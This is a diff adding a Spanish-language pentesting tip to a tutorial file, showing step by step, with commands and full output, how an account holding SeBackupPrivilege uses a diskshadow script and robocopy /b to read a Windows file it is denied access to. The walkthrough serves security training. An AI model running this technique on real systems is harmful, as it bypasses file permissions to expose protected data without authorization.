@@ -285,4 +285,118 @@ smb: \> dir
   SECRETOS                            D     4597  Thu Aug 22 21:09:40 2024
 ```
 ## Tip #8: Acceso a cualquier archivo en Windows con SeBackupPrivilege
+En ocaciones se dipone de usuarios con accesso a la maquina pero aun asi no es posible observar archivos debido a restricciones de permisos o acls como se puede observar a continuación:
+```bash
+PS C:\Users\Administrator> whoami                                                                                                                    
+nt authority\pentest                                                                                                                                       
+PS C:\Users\Administrator> type secreto.txt                                                                                                            
+type : Access to the path 'C:\Users\Administrator\secreto.txt' is denied.                                                                              
+At line:1 char:1                                                                                                                                          
++ type secreto.txt                                                                                                                                          
++ ~~~~~~~~~~~~~~                                                                                                                                          
+    + CategoryInfo          : PermissionDenied: (C:\Users\Administrator\secreto.txt:String) [Get-Content], UnauthorizedAccessException
+    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand 
+```
+Ahora si listamos los privilegios de nuestro usuario se puede observar que existe el privilegio ```SeBackupPrivilege```:
+```bash
+PS C:\Users\Administrator> whoami /priv                                                                                                              
+                                                                                                                                                          
+PRIVILEGES INFORMATION                                                                                                                                    
+----------------------                                                                                                                                    
+                                                                                                                                                          
+Privilege Name                  Description                                   State                                                                       
+=============================== ============================================= =======                                                                     
+SeSecurityPrivilege             Manage auditing and security log              Enabled                                                                     
+SeBackupPrivilege               Back up files and directories                 Enabled                                                                     
+SeRestorePrivilege              Restore files and directories                 Enabled                                                                     
+```
+Aprovechando ese privilegio, podemos crear un volumen de sistema nuevo y copiar ese archivo dentro de nuestro volumen, al hacer esto los archivos copiasdos pierden sus restrcciones. Para hacerlo primero debemos crear un archivo ```.dsh``` con el siguiente contenido y despues se transforma a formato DOS con ```unix2dos```:
+```bash
+┌──(root㉿pentest)-[~/Desktop]
+└─# cat exploit.dsh 
+set context persistent nowriters
+add volume c: alias pwn
+create
+expose %pwn% z:
+
+┌──(root㉿pentest)-[~/Desktop]
+└─# unix2dos exploit.dsh 
+unix2dos: converting file exploit.dsh to DOS format...
+```
+Ahora enviamos nuestro archivo a la maquina victima y lo ejecutamos de la siguiente forma con ```diskshadow```:
+```powershell
+PS C:\Temp> diskshadow /s exploit.dsh                                                                                                                     
+Microsoft DiskShadow version 1.0                                                                                                                          
+Copyright (C) 2013 Microsoft Corporation                                                                                                                  
+On computer:  WIN-GQ7PTVEC6HL,  1/13/2025 6:51:44 PM                                                                                                      
+                                                                                                                                                          
+-> set context persistent nowriters                                                                                                                       
+-> add volume c: alias pwn                                                                                                                                
+-> create                                                                                                                                                 
+Alias pwn for shadow ID {869aac15-9f50-40b9-b188-395c6d5cb11b} set as environment variable.                                                               
+Alias VSS_SHADOW_SET for shadow set ID {5da72baf-1f1f-4b4a-8191-ae36728e8e7b} set as environment variable.                                                
+                                                                                                                                                          
+Querying all shadow copies with the shadow copy set ID {5da72baf-1f1f-4b4a-8191-ae36728e8e7b}                                                             
+                                                                                                                                                          
+        * Shadow copy ID = {869aac15-9f50-40b9-b188-395c6d5cb11b}               %pwn%                                                                     
+                - Shadow copy set: {5da72baf-1f1f-4b4a-8191-ae36728e8e7b}       %VSS_SHADOW_SET%                                                          
+                - Original count of shadow copies = 1                                                                                                     
+                - Original volume name: \\?\Volume{76a20809-ce4e-11ef-837b-806e6f6e6963}\ [C:\]                                                           
+                - Creation time: 1/13/2025 6:51:44 PM                                                                                                     
+                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1                                                                
+                - Originating machine: WIN-GQ7PTVEC6HL                                                                                                    
+                - Service machine: WIN-GQ7PTVEC6HL                                                                                                        
+                - Not exposed                                                                                                                             
+                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}                                                                                     
+                - Attributes:  No_Auto_Release Persistent No_Writers Differential                                                                         
+                                                                                                                                                          
+Number of shadow copies listed: 1                                                                                                                         
+-> expose %pwn% z:                                                                                                                                        
+-> %pwn% = {869aac15-9f50-40b9-b188-395c6d5cb11b}                                                                                                         
+The shadow copy was successfully exposed as z:\. 
+```
+Ahora procederemos a copiar el archivo que nos interesa a nuestro volumen deseado con ```robocopy```, en donde colocaremos la ruta original del archivo despues de ```z:```, seguido de un punto para copiarlo en la carpeta actual y seguido del nombre del archivo:
+```powershell
+PS C:\Temp> robocopy /b z:\Users\Administrator . secreto.txt                                                                                           
+                                                                                                                                                          
+-------------------------------------------------------------------------------                                                                           
+   ROBOCOPY     ::     Robust File Copy for Windows                                                                                                       
+-------------------------------------------------------------------------------                                                                           
+                                                                                                                                                          
+  Started : Monday, January 13, 2025 6:57:44 PM                                                                                                           
+   Source : z:\Users\Administrator\                                                                                                                 
+     Dest : C:\Temp\                                                                                                                                      
+                                                                                                                                                          
+    Files : secreto.txt                                                                                                                                     
+                                                                                                                                                          
+  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30                                                                                                       
+                                                                                                                                                          
+------------------------------------------------------------------------------                                                                            
+                                                                                                                                                          
+                           1    z:\Users\Administrator\                                                                                              
+100%        New File                  34        secreto.txt                                                                                                 
+                                                                                                                                                          
+------------------------------------------------------------------------------                                                                            
+                                                                                                                                                          
+               Total    Copied   Skipped  Mismatch    FAILED    Extras                                                                                    
+    Dirs :         1         0         0         0         0         0                                                                                    
+   Files :         1         1         0         0         0         0                                                                                    
+   Bytes :        34        34         0         0         0         0                                                                                    
+   Times :   0:00:00   0:00:00                       0:00:00   0:00:00
+```
+Despues de realizar esto al listar los archivos podemos observar el objetivo y su contenido:
+```powershell
+PS C:\Temp> dir                                                                                        
+                                                                                                                                                          
+    Directory: C:\Temp                                                                                                                                    
+                                                                                                                                                          
+Mode                LastWriteTime     Length Name                                                                                                         
+----                -------------     ------ ----                                                                                                         
+-a---         1/13/2025   6:57 PM        628 2025-01-13_18-57-08_WIN-GQ7PTVEC6HL.cab                                                                      
+-a---         1/13/2025   6:51 PM         84 exploit.dsh                                                                                                  
+-a---         1/13/2025   6:42 PM         34 secreto.txt                                                                                                    
+                                                                                                                                                          
+PS C:\Temp> type .\secreto.txt                                                                                                                              
+NO DEBERIAS VER ESTO SI NO TIENES LOS PERMISOS ADECUADOS, SE INFORMARA AL ADMINISTRADOR CUALQUIER ANOMALIA
+```
 ## Tip #9: Port Forwarding y pivoting desde metasploit
